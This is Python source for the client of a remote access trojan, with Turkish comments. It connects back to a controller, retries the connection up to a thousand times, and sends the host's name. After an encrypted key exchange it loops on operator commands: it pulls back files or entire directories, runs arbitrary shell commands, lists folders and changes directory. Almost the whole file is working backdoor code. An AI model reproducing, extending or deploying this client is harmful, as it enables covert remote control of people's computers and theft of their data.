import os
import hashlib
import base64
import time
import ctypes
import socket
import subprocess
from core.utils.commons.networking import pack_msg
from core.utils.commons.networking import unpack_msg
from core.utils.commons.networking import IpToFamily
from core.utils.commons.networking import JSONPacker
from core.utils.commons.networking import JSONUnpacker

from core.utils.commons.exceptions import ReadError
from core.utils.commons.exceptions import WriteError

from core.utils.parser import parse_header

from core.utils.commons.socket_utils import SockUtils
from core.utils.commons.io_utils import IOUtils,Modes

from core.utils.commons.commands import Commands,ErrorMessages

from core.utils.printing import *
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from core.utils.commons.crypto import AESCipher
from core.utils.commons.randomize import random_byte_generator

s = None


class Client:
    def __init__(self,host = None,port = None):
        self.server_credentials = {
            "host":host,
            "port":port
        }
        self.key = random_byte_generator(key_size=32,beautify=True)
        self.iv = hashlib.shake_256(self.key.encode()).hexdigest(32)
        print_status("Anahtarın bu:",self.key,"\n",self.iv)
        self.sock = socket.socket(IpToFamily(self.server_credentials["host"]),socket.SOCK_STREAM)
        try:
            self.hostname = socket.gethostname().encode()
        except:
            self.hostname = "NO_NAMED".encode()
        self.handshake_data = self.key.encode()
        self.connect()
        self.sock.send(self.hostname)
        self.recv_pub_key()
    def __enter__(self):
        return self
    def __exit__(self,*args):
        """
        Hiçbir şey yapmamız gerekmiyor çünkü çıkışta herhangi bir görev yok
        """
        pass # do anything
    def decrypt_public_key(self,data: bytes) -> bytes:
        raw_data = base64.b16decode(data)
        key = raw_data[0:64]
        iv = raw_data[-64:]
        with AESCipher(key=key,iv=iv) as cipher:
            raw_pub_key = cipher.decrypt(raw_data[64:len(raw_data)-64]) # <AES_KEY> # len:64 ENCRYPTED_PUB_KEY <AES_IV> # len: 64
            return raw_pub_key
    def _recv(self,socket_descriptor: socket) -> bytes:
        try:
            raw_msglen = unpack_msg(socket_descriptor.recv(4))
            raw_data = socket_descriptor.recv(raw_msglen)
            while len(raw_data) < raw_msglen:
                raw_data+=socket_descriptor.recv(raw_msglen-len(raw_data))
            return raw_data
        except socket.timeout:
            return b""
    def recv_pub_key(self):
        data = self._recv(self.sock)
        try:
            self.decrypted_pub_key = self.decrypt_public_key(data)
            self.rsa_key_handler = base64.b85encode(PKCS1_OAEP.new(RSA.import_key(self.decrypted_pub_key)).encrypt(self.handshake_data))
            self.sock.send(pack_msg(self.rsa_key_handler))
        except Exception as e:
            print(e)
            self.sock.close()
            self.connect()
    def connect(self) -> bool:
        for _ in range(1000):
            try:
                self.sock.connect((self.server_credentials["host"],self.server_credentials["port"]))
                return True
                break
            except:
                time.sleep(10) # 10 saniye bekleyip tekrar bağlanacak
                continue
        try:
            self.sock.send(self.hostname)
        except:
            pass
        try:
            self.recv_pub_key()
        except: pass
    def create_package_response(self,header,**kwargs):
        self.sock_handler.send(header,commands=kwargs)
    def download(self,path):
        if not os.path.exists(path):
            self.sock_handler.send(header="file_credentials",commands={"file_path":"invalid_path"})
        else:
            if os.path.isfile(path):
                with IOUtils(path,mode=Modes.MODE_READ_AS_BINARY) as io_handler:
                    data = io_handler.read()
                    self.sock_handler.send("file_credentials",commands={"file_path":path,"file_data":data})
            elif os.path.isdir(path):
                for root,_,files in os.walk(path):
                    for f in files:
                        full_path = os.path.join(root,f)
                        with IOUtils(full_path,mode=Modes.MODE_READ_AS_BINARY) as io_handler:
                            data = io_handler.read()
                            self.sock_handler.send("file_credentials",commands={"file_path":full_path,"file_data":data})
                self.sock_handler.send("file_credentials",commands={"file_path":"EOP","file_data":""})
            else:
                self.sock_handler.send("file_credentials",commands={"file_path":"invalid_file_type","file_data":""})
    def shell(self,commands):
        try:
            executed_command_output = str(os.system(commands))
            self.sock_handler.send("shell_exec",commands={"command_output":executed_command_output})
        except Exception as exec_err:
            self.sock_handler.send(header=ErrorMessages.ERR_MSG_I_CANT_DO_SHELL_EXEC,commands={"exception":str(exec_err)})
    def msgbox(self,msg: str) -> str:
        try:
            ctypes.windll.user32.MessageBoxW(None,msg,title,64)
        except:
            pass
    def ls(self,path: str):
        if not os.path.exists(path):
            self.create_package_response(
                ErrorMessages.ERR_MSG_I_CANT_DO_LIST_CURRENT_PATH,data="invalid_path"
            )
        elif not os.path.isdir(path):
            self.create_package_response(
                ErrorMessages.ERR_MSG_I_CANT_DO_LIST_CURRENT_PATH,data="path_is_not_dir"
            )
        else:
            data = []
            for p in os.listdir(path):
                full_p = os.path.join(path,p)
                if os.path.isfile(full_p):
                    data.append(f"Dosya: {p}")
                elif os.path.isdir(full_p):
                    data.append(f"Klasör: {p}")
            self.create_package_response(
                Commands.COMMAND_DO_LIST_CURRENT_PATH,
                data=data
            )
    def cd(self,path: str):
        try:
            os.chdir(path)
            self.create_package_response(
                Commands.COMMAND_DO_CD_PATH
            )
        except Exception as e:
            self.create_package_response(
                ErrorMessages.ERR_MSG_I_CANT_DO_CD_PATH,
                exc=str(e)
            )
    def pwd(self):
        self.create_package_response(Commands.COMMAND_DO_GET_PWD,pwd=os.getcwd())
    def handle_commands(self):
        self.sock_handler = SockUtils(socket_descriptor=self.sock,aes_key=self.key,aes_iv=self.iv,max_timeout=None)
        while True:
            raw_data = self.sock_handler.recv()
            pkt_header = parse_header(raw_data,index=0)
            data = raw_data[pkt_header]
            if pkt_header:
                if pkt_header == Commands.COMMAND_DO_DOWNLOAD:
                    file_path = data["path"]
                    self.download(file_path)
                elif pkt_header == Commands.COMMAND_DO_SHELL_EXEC:
                    command = data["commands"]
                    self.shell(commands=command)
                elif pkt_header == Commands.COMMAND_DO_LIST_CURRENT_PATH:
                    d = data["path"]
                    self.ls(d)
                elif pkt_header == Commands.COMMAND_DO_GET_PWD:
                    self.pwd()
                elif pkt_header == Commands.COMMAND_DO_CD_PATH:
                    self.cd(data["cd_to"])
                elif pkt_header == Commands.COMMAND_DO_GET_CLIENT_IS_ONLINE:
                    pass
if __name__ == "__main__":
    try:
        with Client(host="127.0.0.1",port=4444) as client:
            client.handle_commands()
    except Exception as e:
        raise Exception("") from e
